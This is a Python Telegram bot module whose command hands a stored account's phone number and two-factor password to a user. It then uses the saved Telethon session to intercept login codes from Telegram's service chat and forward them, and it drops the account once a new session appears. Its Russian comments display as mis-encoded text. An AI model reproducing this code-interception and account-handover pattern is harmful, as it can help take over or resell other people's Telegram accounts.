import asyncio
import re
import logging
import os
from datetime import datetime, timedelta

from aiogram import Router, types
from aiogram.filters import Command
from telethon import TelegramClient, events
from telethon.errors import SessionRevokedError, FloodWaitError
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest

from bot.core.bot_instance import bot
from db.services.telegram_crud import (
    get_telegram_account_by_alias,
    delete_telegram_account,
)
from db.models.model import User
from dotenv import load_dotenv

load_dotenv()
API_TELETHON_ID = int(os.getenv("API_TELETHON_ID"))
API_TELETHON_HASH = os.getenv("API_TELETHON_HASH")

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

router = Router()

async def poll_for_new_session(
    client: TelegramClient,
    initial_count: int,
    alias: str,
    phone: str,
    chat_id: int,
    max_duration: int = 60
):
    """
    –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç, –Ω–µ –ø–æ—è–≤–∏–ª–æ—Å—å –ª–∏ –±–æ–ª—å—à–µ —Å–µ—Å—Å–∏–π, —á–µ–º –±—ã–ª–æ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ (initial_count).
    –ï—Å–ª–∏ –¥–∞ ‚Äî —Å—á–∏—Ç–∞–µ–º, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞—à—ë–ª (–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª—Å—è –≥–¥–µ-—Ç–æ –µ—â—ë),
    —É–¥–∞–ª—è–µ–º –∞–∫–∫–∞—É–Ω—Ç –∏–∑ –ë–î –∏ –∑–∞–≤–µ—Ä—à–∞–µ–º —Ä–∞–±–æ—Ç—É –∫–ª–∏–µ–Ω—Ç–∞.

    :param client: –≠–∫–∑–µ–º–ø–ª—è—Ä Telethon –∫–ª–∏–µ–Ω—Ç–∞
    :param initial_count: –ò—Å—Ö–æ–¥–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π
    :param alias: Alias –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ –ë–î
    :param phone: –¢–µ–ª–µ—Ñ–æ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
    :param chat_id: ID —á–∞—Ç–∞, –∫—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    :param max_duration: –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è –≤ —Å–µ–∫—É–Ω–¥–∞—Ö, –≤ —Ç–µ—á–µ–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–≥–æ –º—ã –∂–¥—ë–º –ø–æ—è–≤–ª–µ–Ω–∏—è –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏
    """
    end_time = datetime.utcnow() + timedelta(seconds=max_duration)
    while datetime.utcnow() < end_time:
        await asyncio.sleep(5)  # –ò–Ω—Ç–µ—Ä–≤–∞–ª –æ–ø—Ä–æ—Å–∞
        try:
            auth_result = await client(GetAuthorizationsRequest())
            current_count = len(auth_result.authorizations)
        except SessionRevokedError:
            # –°–µ—Å—Å–∏—é –∞–Ω–Ω—É–ª–∏—Ä–æ–≤–∞–ª–∏ (Terminate all sessions)
            logger.warning(f"Session revoked for alias={alias}, phone={phone}")
            await bot.send_message(chat_id, f"–°–µ—Å—Å–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ <b>{alias}</b> –æ—Ç–æ–∑–≤–∞–Ω–∞. –£–¥–∞–ª—è–µ–º –∏–∑ –ë–î.", parse_mode="HTML")
            delete_telegram_account(alias, phone)
            await client.disconnect()
            return
        except FloodWaitError as e:
            # Telegram –ø—Ä–æ—Å–∏—Ç –ø–æ–¥–æ–∂–¥–∞—Ç—å e.seconds
            logger.warning(f"FloodWaitError: –Ω—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å {e.seconds} —Å–µ–∫. alias={alias}, phone={phone}")
            await asyncio.sleep(e.seconds)
            continue
        except Exception as e:
            logger.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ GetAuthorizationsRequest: {e}")
            # –ù–µ –∑–∞–≤–µ—Ä—à–∞–µ–º –∫–ª–∏–µ–Ω—Ç —Å—Ä–∞–∑—É, –Ω–æ —Å–æ–æ–±—â–∞–µ–º –≤ —á–∞—Ç
            await bot.send_message(chat_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Å–µ—Å—Å–∏–π: {e}")
            return

        if current_count > initial_count:
            # –ù–æ–≤–∞—è —Å–µ—Å—Å–∏—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞
            logger.info(f"New session detected for alias={alias}, phone={phone}")
            delete_telegram_account(alias, phone)
            await bot.send_message(
                chat_id,
                f"–ê–∫–∫–∞—É–Ω—Ç <b>{alias}</b> —É–¥–∞–ª—ë–Ω –∏–∑ –ë–î (–æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –Ω–æ–≤–∞—è —Å–µ—Å—Å–∏—è).",
                parse_mode="HTML"
            )
            await client.disconnect()
            return

    # –ï—Å–ª–∏ –º—ã –¥–æ—à–ª–∏ —Å—é–¥–∞, –∑–Ω–∞—á–∏—Ç –≤—Ä–µ–º—è –≤—ã—à–ª–æ, –∞ –Ω–æ–≤–æ–π —Å–µ—Å—Å–∏–∏ –Ω–µ –ø–æ—è–≤–∏–ª–æ—Å—å
    logger.info(f"Timeout reached for alias={alias}, phone={phone}. No new session found.")
    await bot.send_message(
        chat_id,
        f"–í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è (–¥–æ {max_duration} —Å–µ–∫.) –∏—Å—Ç–µ–∫–ª–æ, –Ω–æ–≤–∞—è —Å–µ—Å—Å–∏—è –Ω–µ –ø–æ—è–≤–∏–ª–∞—Å—å. "
        "–ï—Å–ª–∏ –≤—ã –Ω–µ —Å–º–æ–≥–ª–∏ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–Ω–æ–≤–æ.",
        parse_mode="HTML"
    )


async def listen_for_code_and_check_session(string_session: str, chat_id: int, alias: str, phone: str):
    """
    –ü–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è –∫ –¢–µ–ª–µ–≥—Ä–∞–º—É, —Å–ª—É—à–∞–µ—Ç —á–∞—Ç 777000 –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–æ–¥–∞
    –∏ –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –ø–æ—è–≤–ª–µ–Ω–∏–µ –Ω–æ–≤—ã—Ö —Å–µ—Å—Å–∏–π —á–µ—Ä–µ–∑ GetAuthorizationsRequest.

    :param string_session: –°–æ—Ö—Ä–∞–Ω—ë–Ω–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–∞—è —Å–µ—Å—Å–∏—è
    :param chat_id: ID —á–∞—Ç–∞ –≤ –¢–µ–ª–µ–≥—Ä–∞–º, –∫—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    :param alias: Alias –∞–∫–∫–∞—É–Ω—Ç–∞
    :param phone: –¢–µ–ª–µ—Ñ–æ–Ω –∞–∫–∫–∞—É–Ω—Ç–∞
    """
    client = TelegramClient(StringSession(string_session), API_TELETHON_ID, API_TELETHON_HASH)
    await client.connect()

    # –°–∫–æ–ª—å–∫–æ —Å–µ—Å—Å–∏–π —É–∂–µ –µ—Å—Ç—å?
    try:
        auth_result = await client(GetAuthorizationsRequest())
        initial_count = len(auth_result.authorizations)
    except SessionRevokedError:
        # –°–µ—Å—Å–∏—è –æ—Ç–æ–∑–≤–∞–Ω–∞ –¥–æ —Ç–æ–≥–æ, –∫–∞–∫ –º—ã –≤–æ–æ–±—â–µ –Ω–∞—á–∞–ª–∏
        logger.warning(f"Session revoked immediately for alias={alias}, phone={phone}")
        await bot.send_message(chat_id, f"–°–µ—Å—Å–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ <b>{alias}</b> —É–∂–µ –æ—Ç–æ–∑–≤–∞–Ω–∞. –£–¥–∞–ª—è–µ–º –∏–∑ –ë–î.", parse_mode="HTML")
        delete_telegram_account(alias, phone)
        await client.disconnect()
        return
    except Exception as e:
        logger.exception(f"Failed to get authorizations for alias={alias}, phone={phone}: {e}")
        await bot.send_message(chat_id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —Å–µ—Å—Å–∏–π: {e}")
        await client.disconnect()
        return

    @client.on(events.NewMessage(incoming=True, chats=(777000,)))
    async def code_handler(event):
        """
        –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º –∫–æ–¥ –∏–∑ —á–∞—Ç–∞ 777000 –∏ –ø–µ—Ä–µ—Å—ã–ª–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.
        """
        message_text = event.raw_text
        match = re.search(r"\b\d{5,6}\b", message_text)
        if match:
            code = match.group(0)
            logger.info(f"Code {code} received for alias={alias}, phone={phone}")
            await bot.send_message(
                chat_id,
                f"üîë –í–∞—à –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: <code>{code}</code>",
                parse_mode="HTML"
            )

    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ñ–æ–Ω–æ–≤—ã–π –æ–ø—Ä–æ—Å —Å–µ—Å—Å–∏–π
    asyncio.create_task(poll_for_new_session(client, initial_count, alias, phone, chat_id))

    # –£–¥–µ—Ä–∂–∏–≤–∞–µ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
    try:
        await client.run_until_disconnected()
    except SessionRevokedError:
        logger.warning(f"Session revoked while listening for code. alias={alias}, phone={phone}")
        await bot.send_message(chat_id, f"–°–µ—Å—Å–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ <b>{alias}</b> –±—ã–ª–∞ –æ—Ç–æ–∑–≤–∞–Ω–∞. –£–¥–∞–ª—è–µ–º –∏–∑ –ë–î.", parse_mode="HTML")
        delete_telegram_account(alias, phone)
        await client.disconnect()
    except Exception as e:
        logger.exception(f"Unhandled error in run_until_disconnected: {e}")
        await bot.send_message(chat_id, f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –≤ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏–∏: {e}")
        await client.disconnect()


@router.message(Command("take_tg"))
async def cmd_take_tg(message: types.Message, current_user: User):
    """
    –í—ã–≤–æ–¥–∏—Ç –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–π –∫ –∞–∫–∫–∞—É–Ω—Ç—É, –∏ –∑–∞–ø—É—Å–∫–∞–µ—Ç —Ñ–æ–Ω–æ–≤—ã–π –ø—Ä–æ—Ü–µ—Å—Å
    –¥–ª—è –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è —á–∞—Ç–∞ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–æ–≤—ã—Ö —Å–µ—Å—Å–∏–π.
    """
    alias = message.text.split(maxsplit=1)[1].strip() if len(message.text.split()) > 1 else None
    if not alias:
        await message.answer(
            "–í–≤–µ–¥–∏—Ç–µ alias –∞–∫–∫–∞—É–Ω—Ç–∞ –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã. –ü—Ä–∏–º–µ—Ä: /take_tg <i>my_account</i>",
            parse_mode="HTML"
        )
        return

    account = get_telegram_account_by_alias(user_id=current_user.id, alias=alias)
    if not account:
        await message.answer("–ê–∫–∫–∞—É–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ alias –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–Ω–æ–≤–æ.")
        return

    # –í—ã–≤–æ–¥–∏–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∞–∫–∫–∞—É–Ω—Ç–µ
    if account.get('two_factor'):
        msg_text = (
            f"‚úÖ –í–æ—Ç –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–π –∫ –∞–∫–∫–∞—É–Ω—Ç—É <b>{alias}</b>:\n"
            f"üìû <code>{account['phone']}</code>\n"
            f"pass: <code>{account['two_factor_pass']}</code>\n\n"
            "–í–≤–µ–¥–∏—Ç–µ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä –≤ Telegram."
        )
    else:
        msg_text = (
            f"‚úÖ –í–æ—Ç –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–π –∫ –∞–∫–∫–∞—É–Ω—Ç—É <code>{alias}</code>:\n"
            f"üìû <code>{account['phone']}</code>\n\n"
            "–í–≤–µ–¥–∏—Ç–µ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä –≤ Telegram."
        )

    await message.answer(msg_text, parse_mode="HTML")

    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ñ–æ–Ω–æ–≤—É—é –∑–∞–¥–∞—á—É –¥–ª—è –ø—Ä–æ—Å–ª—É—à–∫–∏ –∫–æ–¥–∞ –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–æ–≤—ã—Ö —Å–µ—Å—Å–∏–π
    asyncio.create_task(
        listen_for_code_and_check_session(
            string_session=account['session_string'],
            chat_id=message.chat.id,
            alias=alias,
            phone=account['phone']
        )
    )
